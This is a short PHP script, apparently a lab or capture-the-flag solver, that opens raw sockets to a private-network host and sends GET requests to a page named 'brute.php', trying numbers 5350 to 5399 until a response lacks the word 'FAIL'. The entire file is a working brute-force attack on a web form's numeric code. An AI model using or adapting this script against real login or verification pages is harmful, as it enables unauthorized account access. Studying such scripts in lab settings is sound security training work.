<?php

$domain = '10.10.0.142';
$port = 30603;

for ($i = 5350; $i < 5400; $i++) {
    echo "-------------------- $i -------------------\n";

//    $bodyData = "num=" . $i;

    $s = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
    $res = socket_connect($s, $domain, $port);

    $header = "GET /attack/buruteforce/brute.php?num=$i&submit=submit HTTP/1.1\r\n";
    $header .= "Host: 0.0.0.0\r\n"; //fix
    $header .= "Content-type: application/x-www-form-urlencoded\r\n";
    //$header .= "Content-Length:" . strlen($bodyData) . "\r\n";
    //$header .= "\r\n";
    //$header .= $bodyData . "\r\n\r\n";

    $res = socket_write($s, $header, strlen($header));
    echo $header;
    $data = '';
    while ($row = socket_read($s, 1024)) {
        $data .= $row;


    }
    echo $data . "\n\n";

    if (!strstr($data, "FAIL"))
    {
        echo $i;
        exit;
    }

    socket_close($s);
}

?>